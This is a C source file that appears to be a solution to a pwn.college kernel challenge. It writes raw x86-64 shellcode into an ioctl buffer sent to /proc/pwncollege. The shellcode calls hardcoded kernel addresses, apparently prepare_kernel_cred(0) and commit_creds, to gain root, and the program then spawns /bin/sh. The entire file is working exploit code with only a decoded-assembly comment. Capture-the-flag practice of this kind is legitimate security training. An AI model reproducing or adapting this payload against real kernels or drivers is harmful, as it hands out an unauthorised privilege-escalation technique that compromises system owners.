#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>

int main() {
	//void *shellcode = get_root;
	int fd = open("/proc/pwncollege", O_WRONLY);
	assert(fd > 0);
	// asm("xor rdi, rdi; mov rax, 0xffffffff810890d0; call rax; mov rdi, rax; mov rax, 0xffffffff81088d90; call rax; ret")
	char shellcode[0x1000+8+8] = {0};
	memcpy(shellcode, "\x25\x00\x00\x00\x00\x00\x00\x00H1\xffH\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3", 25+8);
	((uintptr_t *)shellcode)[513] = 0xffffc90000085000;
	ioctl(fd, 0x539, shellcode);
	// we are root now
	execl("/bin/sh", "/bin/sh", NULL);

	return 0;
}
